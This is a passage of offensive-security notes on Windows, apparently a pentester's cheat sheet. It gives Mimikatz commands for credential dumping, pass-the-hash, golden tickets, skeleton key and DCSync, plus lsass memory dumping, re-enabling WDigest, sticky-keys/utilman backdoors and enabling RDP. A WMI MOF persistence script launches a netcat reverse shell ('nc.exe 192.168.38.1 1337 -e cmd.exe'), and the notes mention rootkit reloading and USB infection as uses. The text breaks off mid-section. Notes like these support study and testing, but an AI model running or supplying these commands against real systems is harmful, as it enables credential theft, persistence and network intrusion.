<li>localrecon.cmd: Utility to generate a summary of a Windows system: <a href="https://github.com/bitsadmin/miscellaneous/blob/master/localrecon.cmd">https://github.com/bitsadmin/miscellaneous/blob/master/localrecon.cmd</a></li>
<li>Empire: post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent: <a href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a></li>
<li>Seatbelt: C# project that performs a number of security oriented host-survey "safety checks": <a href="https://github.com/GhostPack/Seatbelt">https://github.com/GhostPack/Seatbelt</a></li>
<li></li>
</ul>
<h4 id="mimikatz">Mimikatz<a class="headerlink" href="#mimikatz" title="Permanent link">&para;</a></h4>
<ul>
<li>Mimikatz 2.0 - Golden Ticket Walkthrough: <a href="https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Golden_Ticket_Walkthrough.html">https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Golden_Ticket_Walkthrough.html</a></li>
<li>General commands:
    <div class="codehilite"><pre><span></span><span class="n">privilege</span><span class="o">::</span><span class="n">debug</span>

<span class="n">sekurlsa</span><span class="o">::</span><span class="n">logonPasswords</span> <span class="n">full</span>
<span class="n">sekurlsa</span><span class="o">::</span><span class="n">pth</span> <span class="o">/</span><span class="nl">user</span><span class="p">:</span><span class="n">Administrator</span> <span class="o">/</span><span class="nl">domain</span><span class="p">:</span><span class="n">WOSHUB</span> <span class="o">/</span><span class="nl">ntlm</span><span class="p">:{</span><span class="n">NTLM_hash</span><span class="p">}</span> <span class="o">/</span><span class="nl">run</span><span class="p">:</span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span>

<span class="n">misc</span><span class="o">::</span><span class="n">skeleton</span>

<span class="n">ipconfig</span> <span class="o">/</span><span class="n">all</span>
<span class="n">whoami</span> <span class="o">/</span><span class="n">user</span>
<span class="n">lsadump</span><span class="o">::</span><span class="n">lsa</span> <span class="o">/</span><span class="n">inject</span> <span class="o">/</span><span class="nl">name</span><span class="p">:</span><span class="n">krbtgt</span>
<span class="n">kerbros</span><span class="o">::</span><span class="n">golden</span> <span class="o">/</span><span class="nl">domain</span><span class="p">:[</span><span class="n">Domain</span><span class="p">]</span> <span class="o">/</span><span class="nl">sid</span><span class="p">:[</span><span class="n">SID</span><span class="p">]</span> <span class="o">/</span><span class="nl">rc4</span><span class="p">:[</span><span class="n">NTLM</span> <span class="n">Hash</span><span class="p">]</span> <span class="o">/</span><span class="nl">user</span><span class="p">:[</span><span class="n">Username</span> <span class="n">To</span> <span class="n">Create</span><span class="p">]</span> <span class="o">/</span><span class="kt">id</span><span class="o">:</span><span class="mi">500</span> <span class="o">/</span><span class="n">ptt</span>
<span class="n">pushd</span> <span class="err">\\</span><span class="n">WINSERVER01</span><span class="err">\</span><span class="n">c</span><span class="err">$</span>
<span class="n">cd</span> <span class="n">WINDOWS</span><span class="err">\</span><span class="n">NTDS</span>
</pre></div></li>
<li>If WDigest is disabled: 
    <div class="codehilite"><pre><span></span><span class="n">reg</span> <span class="k">add</span> <span class="n">HKLM</span><span class="err">\</span><span class="k">SYSTEM</span><span class="err">\</span><span class="n">CurrentControlSet</span><span class="err">\</span><span class="n">Control</span><span class="err">\</span><span class="n">SecurityProviders</span><span class="err">\</span><span class="n">WDigest</span> <span class="o">/</span><span class="n">v</span> <span class="n">UseLogonCredential</span> <span class="o">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="o">/</span><span class="n">d</span> <span class="mi">1</span>
</pre></div></li>
<li>Export memory dump and use it in Mimikatz:
    <div class="codehilite"><pre><span></span><span class="k">Get</span><span class="o">-</span><span class="n">Process</span> <span class="n">lsass</span> <span class="o">|</span> <span class="k">Out</span><span class="o">-</span><span class="n">Minidump</span>
<span class="n">sekurlsa</span><span class="p">::</span><span class="n">minidump</span> <span class="n">lsass_592</span><span class="p">.</span><span class="n">dmp</span>
</pre></div></li>
<li>Using VMWare / Hibernate file: <a href="http://woshub.com/how-to-get-plain-text-passwords-of-windows-users/">http://woshub.com/how-to-get-plain-text-passwords-of-windows-users/</a></li>
<li>Mimikatz features: <a href="https://adsecurity.org/?page_id=1821">https://adsecurity.org/?page_id=1821</a></li>
<li>DCSync<ul>
<li><a href="https://adsecurity.org/?p=1729">https://adsecurity.org/?p=1729</a>
  <div class="codehilite"><pre><span></span>mimikatz <span class="s2">&quot;lsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt&quot;</span>
mimikatz <span class="s2">&quot;lsadump::dcsync /domain:rd.adsecurity.org /user:Administrator&quot;</span>
</pre></div></li>
<li>"impersonates" a Domain Controller and requests account password data from the targeted Domain Controller.</li>
<li>Required Permissions: Any member of <code class="codehilite"><span class="n">Administrators</span></code>, <code class="codehilite"><span class="k">Domain</span> <span class="n">Admins</span></code>, or <code class="codehilite"><span class="n">Enterprise</span> <span class="n">Admins</span></code> as well as <code class="codehilite"><span class="k">Domain</span> <span class="n">Controller</span></code> computer accounts. Read-Only Domain Controllers are not allowed to pull password data for users by default.</li>
<li>Prior to DCSync was to run Mimikatz or Invoke-Mimikatz on a Domain Controller to get the <code class="codehilite"><span class="n">KRBTGT</span> <span class="n">password</span> <span class="n">hash</span></code> to create <code class="codehilite"><span class="n">Golden</span> <span class="n">Tickets</span></code></li>
<li>With DCSync, the attacker can pull the password hash, as well as previous password hashes, from a Domain Controller over the network without requiring interactive logon or copying off the Active Directory database file (ntds.dit).</li>
<li>Internals:<ul>
<li>Discovers Domain Controller in the specified domain name.</li>
<li>Requests the Domain Controller replicate the user credentials via <a href="https://wiki.samba.org/index.php/DRSUAPI">GetNCChanges</a> (leveraging Directory Replication Service (DRS) Remote Protocol)
<div class="codehilite"><pre><span></span><span class="s2">&quot;</span><span class="s">The client DC sends a DSGetNCChanges request to the server when the first one wants to get AD objects updates from the second one. The response contains a set of updates that the client has to apply to its NC replica.</span>

<span class="nv">It</span> <span class="nv">is</span> <span class="nv">possible</span> <span class="nv">that</span> <span class="nv">the</span> <span class="nv">set</span> <span class="nv">of</span> <span class="nv">updates</span> <span class="nv">is</span> <span class="nv">too</span> <span class="nv">large</span> <span class="k">for</span> <span class="nv">only</span> <span class="nv">one</span> <span class="nv">response</span> <span class="nv">message</span>. <span class="nv">In</span> <span class="nv">those</span> <span class="nv">cases</span>, <span class="nv">multiple</span> <span class="nv">DSGetNCChanges</span> <span class="nv">requests</span> <span class="nv">and</span> <span class="nv">responses</span> <span class="nv">are</span> <span class="nv">done</span>. <span class="nv">This</span> <span class="nv">process</span> <span class="nv">is</span> <span class="nv">called</span> <span class="nv">replication</span> <span class="nv">cycle</span> <span class="nv">or</span> <span class="nv">simply</span> <span class="nv">cycle</span>.<span class="s2">&quot;</span>

<span class="s2">&quot;</span><span class="s">When a DC receives a DSReplicaSync Request, then for each DC that it replicates from (stored in RepsFrom data structure) it performs a replication cycle where it behaves like a client and makes DSGetNCChanges requests to that DC. So it gets up-to-date AD objects from each of the DC’s which it replicates from.</span><span class="s2">&quot;</span>
</pre></div></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="psexec">PsExec<a class="headerlink" href="#psexec" title="Permanent link">&para;</a></h4>
<ul>
<li>References:<ul>
<li><a href="https://www.contextis.com/en/blog/lateral-movement-a-deep-look-into-psexec">https://www.contextis.com/en/blog/lateral-movement-a-deep-look-into-psexec</a></li>
<li><a href="https://www.toshellandback.com/2017/02/11/psexec/">https://www.toshellandback.com/2017/02/11/psexec/</a></li>
<li><a href="http://fuzzynop.blogspot.com/2012/09/pass-hash-without-metasploit.html">http://fuzzynop.blogspot.com/2012/09/pass-hash-without-metasploit.html</a></li>
</ul>
</li>
</ul>
<h3 id="important-endpoints">Important Endpoints<a class="headerlink" href="#important-endpoints" title="Permanent link">&para;</a></h3>
<ul>
<li>Connection endpoints for Windows 10: <a href="https://docs.microsoft.com/en-us/windows/privacy/manage-windows-1809-endpoints">https://docs.microsoft.com/en-us/windows/privacy/manage-windows-1809-endpoints</a></li>
</ul>
<h3 id="registry">Registry<a class="headerlink" href="#registry" title="Permanent link">&para;</a></h3>
<ul>
<li>Important Registry Locations<ul>
<li>Installed programs: <code class="codehilite"><span class="n">HKLM</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">CurrentVersion</span><span class="err">\</span><span class="n">Uninstall</span></code></li>
<li>Gain system shell at login using 5x[shift]:<ul>
<li><code class="codehilite"><span class="n">HKLM</span><span class="p">:</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span> <span class="n">NT</span><span class="err">\</span><span class="n">CurrentVersion</span><span class="err">\</span><span class="n">Image</span> <span class="n">File</span> <span class="n">Execution</span> <span class="k">Options</span><span class="err">\</span><span class="n">sethc</span><span class="p">.</span><span class="n">exe</span></code> with property <code class="codehilite"><span class="n">Debugger</span></code> set to <code class="codehilite"><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span></code></li>
<li><code class="codehilite"><span class="n">HKLM</span><span class="p">:</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span> <span class="n">NT</span><span class="err">\</span><span class="n">CurrentVersion</span><span class="err">\</span><span class="n">Image</span> <span class="n">File</span> <span class="n">Execution</span> <span class="k">Options</span><span class="err">\</span><span class="n">utilman</span><span class="p">.</span><span class="n">exe</span></code> with property <code class="codehilite"><span class="n">Debugger</span></code> set to <code class="codehilite"><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span></code></li>
<li>Disable macro security:</li>
</ul>
</li>
<li>Enable EDP: <code class="codehilite"><span class="n">reg</span> <span class="k">add</span> <span class="ss">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> <span class="o">/</span><span class="n">v</span> <span class="n">fDenyTSConnections</span> <span class="o">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="o">/</span><span class="n">d</span> <span class="mi">0</span> <span class="o">/</span><span class="n">f</span></code></li>
</ul>
</li>
<li>Ways to access registry<ul>
<li>cmd: <code class="codehilite"><span class="n">cmd</span> <span class="o">/</span><span class="k">c</span> <span class="n">REG</span> <span class="n">QUERY</span></code></li>
<li>Powershell:<ul>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Item</span> <span class="o">&lt;</span><span class="n">path</span><span class="o">&gt;</span></code></li>
<li>For remote use: <code class="codehilite"><span class="n">Enter</span><span class="o">-</span><span class="n">PSSession</span></code> and inside the session use <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Item</span></code></li>
</ul>
</li>
<li>WMI (StdRegProv)<ul>
<li>To find IDs use: <a href="https://github.com/darkoperator/Posh-SecMod/blob/master/Registry/Registry.ps1">https://github.com/darkoperator/Posh-SecMod/blob/master/Registry/Registry.ps1</a>
  <div class="codehilite"><pre><span></span><span class="err">$</span><span class="n">RemoteReg</span> <span class="o">=</span> <span class="k">Get</span><span class="o">-</span><span class="n">WmiObject</span> <span class="o">-</span><span class="n">List</span> <span class="ss">&quot;StdRegProv&quot;</span> <span class="o">-</span><span class="n">ComputerName</span> <span class="o">&lt;</span><span class="n">name</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">Credential</span> <span class="o">&lt;</span><span class="n">cred</span><span class="o">&gt;</span>
<span class="err">$</span><span class="n">RemoteReg</span> <span class="o">|</span> <span class="k">Select</span><span class="o">-</span><span class="k">Object</span> <span class="o">-</span><span class="n">ExpandProperty</span> <span class="n">methods</span> <span class="o">|</span> <span class="k">more</span>
<span class="err">$</span><span class="n">RemoteReg</span><span class="p">.</span><span class="n">getStringValue</span><span class="p">(</span><span class="o">&lt;</span><span class="n">id</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="n">path</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="n">propertyName</span><span class="o">&gt;</span><span class="p">)</span>
</pre></div></li>
</ul>
</li>
<li>.Net
  <div class="codehilite"><pre><span></span><span class="p">[</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">Win32</span><span class="p">.</span><span class="n">RegistryKey</span><span class="p">].</span><span class="n">getMethods</span><span class="p">()</span>
</pre></div></li>
<li><a href="https://archive.codeplex.com/?p=psremoteregistry">https://archive.codeplex.com/?p=psremoteregistry</a></li>
</ul>
</li>
<li>Tasks<ul>
<li>Recently used commands</li>
<li>Installed apps</li>
<li>Turn off network level auth</li>
<li>Attach debugger to setg.exe</li>
</ul>
</li>
</ul>
<h2 id="general-exploits">General Exploits<a class="headerlink" href="#general-exploits" title="Permanent link">&para;</a></h2>
<h2 id="important-files">Important Files<a class="headerlink" href="#important-files" title="Permanent link">&para;</a></h2>
<ul>
<li><code class="codehilite"><span class="n">mpengine</span><span class="p">.</span><span class="n">dll</span></code> (+ mpasbase.vdm mpasdlta.vdm   mpavbase.vdm mpavdlta.vdm)<ul>
<li>Windows Defender - Microsoft Malware Protection Engine</li>
<li>Take buffer of data and decide of malicious or not</li>
</ul>
</li>
<li><code class="codehilite"><span class="n">MPSigStub</span><span class="p">.</span><span class="n">exe</span></code><ul>
<li>Microsoft Malware Protection Signatuee Update Stub  </li>
</ul>
</li>
</ul>
<h2 id="special-file-handling">Special File Handling<a class="headerlink" href="#special-file-handling" title="Permanent link">&para;</a></h2>
<h2 id="windows-api">Windows API<a class="headerlink" href="#windows-api" title="Permanent link">&para;</a></h2>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Windows_API#Versions">https://en.wikipedia.org/wiki/Windows_API#Versions</a></li>
<li>Using Python on Windows: <a href="https://docs.python.org/3/using/windows.html">https://docs.python.org/3/using/windows.html</a></li>
<li>theForger's Win32 API Programming Tutorial: <a href="http://www.winprog.org/tutorial/">http://www.winprog.org/tutorial/</a></li>
<li>Windows API Reference: <a href="https://docs.microsoft.com/en-us/previous-versions//aa383749(v=vs.85)?redirectedfrom=MSDN">https://docs.microsoft.com/en-us/previous-versions//aa383749(v=vs.85)?redirectedfrom=MSDN</a></li>
</ul>
<ul>
<li>Network Related<ul>
<li>ARP Table: <code class="codehilite"><span class="n">GetIPNetTable</span></code></li>
</ul>
</li>
<li>Services<ul>
<li>Change Services: <code class="codehilite"><span class="n">ChangeServiceConfigW</span></code></li>
</ul>
</li>
</ul>
<h2 id="wmi">WMI<a class="headerlink" href="#wmi" title="Permanent link">&para;</a></h2>
<ul>
<li>Implementation of <code class="codehilite"><span class="n">Common</span> <span class="n">Information</span> <span class="n">Model</span> <span class="p">(</span><span class="n">CIM</span><span class="p">)</span></code> and <code class="codehilite"><span class="n">Web</span><span class="o">-</span><span class="n">Based</span> <span class="n">Enterprise</span> <span class="n">Management</span> <span class="p">(</span><span class="n">WBEM</span><span class="p">)</span></code></li>
<li><code class="codehilite"><span class="n">WBEM</span></code> standard encompasses the design of an<ul>
<li>extensible enterprise data-collection and data-management facility</li>
<li>that has the flexibility and extensibility</li>
<li>required to manage local and remote systems that comprise arbitrary components  </li>
</ul>
</li>
<li><code class="codehilite"><span class="n">WMI</span></code> consists of four main components:<ul>
<li>management applications</li>
<li>WMI infrastructure</li>
<li>providers</li>
<li>managed objects (system, disks, processes, network components...)</li>
</ul>
</li>
<li>Allows<ul>
<li>Execute some code when the notification of an event</li>
</ul>
</li>
</ul>
<p><img alt="" src="../_assets/WMI architecture.png" /></p>
<blockquote>
<ul>
<li><a href="http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html">http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html</a></li>
</ul>
</blockquote>
<p><img alt="image-20190618124144945" src="../_assets/image-20190618124144945.png" /></p>
<blockquote>
<p><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf">https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf</a></p>
</blockquote>
<ul>
<li>CIM classes<ul>
<li>hierarchically organized with subclasses</li>
<li>grouped in namespaces (logical group of classes)</li>
<li>root\cimv2 includes most of the classes that represent computer's resources</li>
<li>Categories <ul>
<li><strong>Core Classes</strong> - Applies to all areas of management (__System_Security)</li>
<li><strong>Common Classes</strong> - Extension of core classes (CIM_UnitaryComputerSystem)</li>
<li><strong>Extended Classes</strong> - Technology specific addition to common classes (Win32_ComputerSystem)</li>
</ul>
</li>
<li>Types<ul>
<li><strong>Abstract</strong> - Template classes used to define other classes. </li>
<li><strong>Static</strong> - Stores data <ul>
<li>WMI configuration</li>
<li>Operational data</li>
</ul>
</li>
<li><strong>Dynamic</strong> - Retrieved from a provider, and represents managed resource (process, service, file, etc.)</li>
<li><strong>Association</strong> - Describe relationship between classes or resources. </li>
</ul>
</li>
</ul>
</li>
<li>WMI Provider <ul>
<li>Bridge between managed object and WMI</li>
<li>Provide access to classes </li>
</ul>
</li>
<li>Namespaces <ul>
<li>CIM classes are decided logically using namespaces </li>
<li>For easier discovery and use</li>
<li><code class="codehilite"><span class="n">root</span><span class="err">\</span><span class="n">cimv2</span></code> <code class="codehilite"><span class="n">root</span><span class="err">\</span><span class="k">default</span></code> <code class="codehilite"><span class="n">root</span><span class="err">\</span><span class="k">security</span></code> <code class="codehilite"><span class="n">root</span><span class="err">\</span><span class="n">subscription</span></code> </li>
</ul>
</li>
<li>WMI repository - stores CIM classes' definitions<ul>
<li><code class="codehilite"><span class="c">%SystemRoot%\System32\wbem\Repository</span></code></li>
</ul>
</li>
</ul>
<h3 id="interesting-cim-classes">Interesting CIM classes<a class="headerlink" href="#interesting-cim-classes" title="Permanent link">&para;</a></h3>
<p>- <a href="http://msdn.microsoft.com/en-us/library/aa394639%28v=vs.85%29.aspx">__EventFilter</a> [<a href="http://msdn.microsoft.com/en-us/library/aa389741%28VS.85%29.aspx">create</a>]: permits to define a Windows event
  - <a href="http://msdn.microsoft.com/en-us/library/aa384749%28VS.85%29.aspx">__EventConsumer</a>: (abstract consumer class)
    - <a href="http://msdn.microsoft.com/en-us/library/aa394635">ActiveScriptEventConsumer</a>: possible to embed VBScript or JSScript in the consumer (only available in <code class="codehilite"><span class="n">root</span><span class="err">\</span><span class="n">subscription</span></code>)
      - Consumer runs with SYSTEM privilege on <code class="codehilite"><span class="n">Windows</span> <span class="n">XP</span></code> and <code class="codehilite"><span class="n">Windows</span> <span class="mi">2003</span> <span class="n">Server</span></code>
      - <code class="codehilite"><span class="n">Vista</span></code>, it is running under the LOCAL_SERVICE user
  - <a href="http://msdn.microsoft.com/en-us/library/aa394647%28v=VS.85%29.aspx">__FilterToConsumerBinding</a>: link two other instances. (permits to activate the consumer - and to execute its code - whenever the defined event occurs)</p>
<h3 id="mof-managed-object-format"><a href="http://msdn.microsoft.com/en-us/library/aa823192%28VS.85%29.aspx">MOF (Managed Object Format)</a><a class="headerlink" href="#mof-managed-object-format" title="Permanent link">&para;</a></h3>
<ul>
<li>Language used to describe CIM classes, namespaces and providers </li>
<li>MOF file needs to be registered into the CIM/WMI repository in order to be taken into account by WMI<ul>
<li>CIM class(es) MOF describes are added into the repository</li>
<li>Stored in <code class="codehilite"><span class="c">%SystemRoot%\System32\wbem</span></code></li>
</ul>
</li>
<li>Compilation<ul>
<li>Compiled using <code class="codehilite"><span class="n">mofcomp</span><span class="p">.</span><span class="n">exe</span></code></li>
</ul>
</li>
<li>Auto compile &amp; register<ul>
<li>Writable to <code class="codehilite"><span class="n">Administrator</span></code> only</li>
<li>Files added to  <code class="codehilite"><span class="c">%SystemRoot%\System32\wbem\mof\</span></code> get auto compiled and registered (before Vista)</li>
<li>Logs are in <code class="codehilite"><span class="c">%SystemRoot%\System32\wbem\mof\Logs\mofcomp.log</span></code></li>
</ul>
</li>
</ul>
<p>Wait for a windows event and trigger:
<div class="codehilite"><pre><span></span><span class="c">#pragma namespace (&quot;\\\\.\\root\\subscription&quot;)</span>

<span class="n">instance</span> <span class="n">of</span> <span class="n">__EventFilter</span> <span class="n">as</span> <span class="nv">$FILTER</span>
<span class="p">{</span>
    <span class="n">Name</span> <span class="p">=</span> <span class="s2">&quot;CLASS_FIRST_TEST&quot;</span><span class="p">;</span>
    <span class="n">EventNamespace</span> <span class="p">=</span> <span class="s2">&quot;root\\cimv2&quot;</span><span class="p">;</span>
 <span class="n">Query</span> <span class="p">=</span> <span class="s2">&quot;SELECT * FROM __InstanceCreationEvent &quot;</span>
  <span class="s2">&quot;WHERE TargetInstance ISA \&quot;</span><span class="n">Win32_NTLogEvent</span><span class="p">\</span><span class="s2">&quot; AND &quot;</span>
  <span class="s2">&quot;TargetInstance.LogFile=\&quot;</span><span class="n">Application</span><span class="p">\</span><span class="s2">&quot;&quot;</span><span class="p">;</span>

    <span class="n">QueryLanguage</span> <span class="p">=</span> <span class="s2">&quot;WQL&quot;</span><span class="p">;</span>
<span class="p">};</span>

<span class="n">instance</span> <span class="n">of</span> <span class="n">ActiveScriptEventConsumer</span> <span class="n">as</span> <span class="nv">$CONSUMER</span>
<span class="p">{</span>
    <span class="n">Name</span> <span class="p">=</span> <span class="s2">&quot;CLASS_FIRST_TEST&quot;</span><span class="p">;</span>
    <span class="n">ScriptingEngine</span> <span class="p">=</span> <span class="s2">&quot;VBScript&quot;</span><span class="p">;</span>

    <span class="n">ScriptText</span> <span class="p">=</span>
      <span class="s2">&quot;Set objShell = CreateObject(\&quot;</span><span class="n">WScript</span><span class="p">.</span><span class="n">Shell</span><span class="p">\</span><span class="s2">&quot;)\n&quot;</span>
   <span class="s2">&quot;objShell.Run \&quot;</span><span class="n">C</span><span class="err">:</span><span class="p">\\</span><span class="n">Windows</span><span class="p">\\</span><span class="n">system32</span><span class="p">\\</span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">C</span> <span class="n">C</span><span class="err">:</span><span class="p">\\</span><span class="n">nc</span><span class="p">.</span><span class="n">exe</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">38</span><span class="p">.</span><span class="n">1</span> <span class="n">1337</span> <span class="n">-e</span> <span class="n">C</span><span class="err">:</span><span class="p">\\</span><span class="n">Windows</span><span class="p">\\</span><span class="n">system32</span><span class="p">\\</span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span><span class="p">\</span><span class="s2">&quot;\n&quot;</span><span class="p">;</span>
<span class="p">};</span>

<span class="n">instance</span> <span class="n">of</span> <span class="n">__FilterToConsumerBinding</span>
<span class="p">{</span>
    <span class="n">Consumer</span> <span class="p">=</span> <span class="nv">$CONSUMER</span> <span class="p">;</span>
    <span class="k">Filter</span> <span class="p">=</span> <span class="nv">$FILTER</span> <span class="p">;</span>
<span class="p">};</span>
</pre></div></p>
<blockquote>
<ul>
<li>Ref: <a href="http://www.hsc-news.com/archives/2011/000078.html">http://www.hsc-news.com/archives/2011/000078.html</a></li>
</ul>
</blockquote>
<p>Self start:
<div class="codehilite"><pre><span></span><span class="c">#pragma namespace (&quot;\\\\.\\root\\subscription&quot;)</span>

<span class="n">class</span> <span class="n">WoootClass</span>
<span class="p">{</span>
 <span class="no">[key]</span>
 <span class="n">string</span> <span class="n">Name</span><span class="p">;</span>
<span class="p">};</span>

<span class="n">instance</span> <span class="n">of</span> <span class="n">__EventFilter</span> <span class="n">as</span> <span class="nv">$FILTER</span>
<span class="p">{</span>
    <span class="n">Name</span> <span class="p">=</span> <span class="s2">&quot;XPLOIT_TEST_SYSTEM&quot;</span><span class="p">;</span>
    <span class="n">EventNamespace</span> <span class="p">=</span> <span class="s2">&quot;root\\subscription&quot;</span><span class="p">;</span>
 <span class="n">Query</span> <span class="p">=</span> <span class="s2">&quot;SELECT * FROM __InstanceCreationEvent &quot;</span>
         <span class="s2">&quot;WHERE TargetInstance.__class = \&quot;</span><span class="n">WoootClass</span><span class="p">\</span><span class="s2">&quot;&quot;</span><span class="p">;</span>

    <span class="n">QueryLanguage</span> <span class="p">=</span> <span class="s2">&quot;WQL&quot;</span><span class="p">;</span>
<span class="p">};</span>

<span class="n">instance</span> <span class="n">of</span> <span class="n">ActiveScriptEventConsumer</span> <span class="n">as</span> <span class="nv">$CONSUMER</span>
<span class="p">{</span>
    <span class="p">//</span> <span class="p">...</span>     
<span class="p">};</span>

<span class="n">instance</span> <span class="n">of</span> <span class="n">__FilterToConsumerBinding</span>
<span class="p">{</span>
    <span class="p">//</span> <span class="p">...</span>
<span class="p">};</span>

<span class="n">instance</span> <span class="n">of</span> <span class="n">WoootClass</span>
<span class="p">{</span>
 <span class="n">Name</span> <span class="p">=</span> <span class="s2">&quot;Woot&quot;</span><span class="p">;</span>
<span class="p">};</span>
</pre></div></p>
<p><strong>Usages</strong></p>
<p>- Automatically kill some processes as soon as they are launched (anti-rootkits...),
  - Automatically detect when the backdoor/rootkit has been deleted to load it again (dropper),
  - Automatically infect USB devices</p>
<h3 id="exploring">Exploring<a class="headerlink" href="#exploring" title="Permanent link">&para;</a></h3>
<p><strong>Exploring Namespaces</strong></p>
<div class="codehilite"><pre><span></span><span class="nb">Get-WmiObject</span> <span class="n">-Namespace</span> <span class="s2">&quot;root&quot;</span> <span class="n">-Class</span> <span class="s2">&quot;__Namespace&quot;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">name</span>
<span class="nb">Get-CimInstance</span>  <span class="n">-Namespace</span> <span class="s2">&quot;root&quot;</span> <span class="n">-Class</span> <span class="s2">&quot;__Namespace&quot;</span> 
</pre></div>

<p>To read nested namespaces:
<div class="codehilite"><pre><span></span><span class="nb">Get-WmiNamespace</span> 
</pre></div></p>
<p><strong>Exploring Classes</strong></p>
<p><code class="codehilite"><span class="o">-</span><span class="n">Namespace</span> <span class="n">root</span><span class="err">\</span><span class="n">cimv2</span></code> is the default of Powershell</p>
<p><div class="codehilite"><pre><span></span><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="p">*</span><span class="n">bios</span><span class="p">*</span> <span class="n">-List</span> 
</pre></div>
<div class="codehilite"><pre><span></span><span class="nb">Get-CimClasses</span> <span class="n">-List</span> 
</pre></div></p>
<p>List only dynamic classes:
<div class="codehilite"><pre><span></span><span class="nb">Get-CimClasses</span> <span class="n">-QualifierName</span> <span class="n">dynamic</span> <span class="n">-List</span>
</pre></div></p>
<p>Look at details of the class:
<div class="codehilite"><pre><span></span><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">Win32_Bios</span> <span class="p">|</span> <span class="nb">fl </span><span class="p">*</span>
</pre></div>
<div class="codehilite"><pre><span></span><span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">Win32_Bios</span> <span class="p">|</span> <span class="nb">fl </span><span class="p">*</span>
</pre></div></p>
<p><strong>Using WMI Class</strong></p>
<p><div class="codehilite"><pre><span></span><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">Win32_Process</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Name</span> <span class="o">-eq</span> <span class="s2">&quot;explorer.exe&quot;</span><span class="p">}</span>

<span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">Win32_Process</span> <span class="p">|</span> <span class="nb">where </span><span class="n">name</span> <span class="o">-eq</span> <span class="s2">&quot;explorer.exe&quot;</span>

<span class="nb">Get-WmiObject</span> <span class="n">-Query</span> <span class="s2">&quot;Select * from Win32_Process where Name = &#39;explorer.exe&#39;&quot;</span>
</pre></div>
<div class="codehilite"><pre><span></span><span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">Win32_Process</span> <span class="n">-Filter</span> <span class="s2">&quot;Name -eq &#39;explorer.exe&#39;&quot;</span>

<span class="nb">Get-CimInstance</span> <span class="n">-Query</span> <span class="s2">&quot;Select * from Win32_Process where Name = &#39;explorer.exe&#39;&quot;</span>
</pre></div></p>
<p>Can use <code class="codehilite"><span class="n">Remove</span><span class="o">-</span><span class="n">WmiObject</span></code> and <code class="codehilite"><span class="n">Remove</span><span class="o">-</span><span class="n">CimInstance</span></code> to close processed, remove registry entries, etc. </p>
<p><strong>Methods</strong></p>
<p>Identifying methods:
<div class="codehilite"><pre><span></span><span class="nb">Get-WmiObject</span> <span class="p">*</span> <span class="n">-List</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Method</span><span class="p">}</span>
<span class="p">(</span><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">Win32_Process</span> <span class="n">-List</span><span class="p">).</span><span class="n">Methods</span> 
<span class="nb">Get-CimClass</span> <span class="n">-Class</span> <span class="n">Win32_Process</span> <span class="n">-List</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">-ExpandProperty</span> <span class="n">Methods</span>
</pre></div>
<div class="codehilite"><pre><span></span><span class="nb">Get-CimClass</span> <span class="n">-MethodName</span> <span class="p">*</span> 
<span class="nb">Get-CimClass</span> <span class="n">-MethodName</span> <span class="p">*</span><span class="n">create</span><span class="p">*</span>
<span class="nb">Get-CimClass</span> <span class="n">-ClassName</span> <span class="n">Win32_Process</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">-ExpandProperty</span> <span class="n">CimClassMethods</span>
</pre></div></p>
<p>Exploring methods:
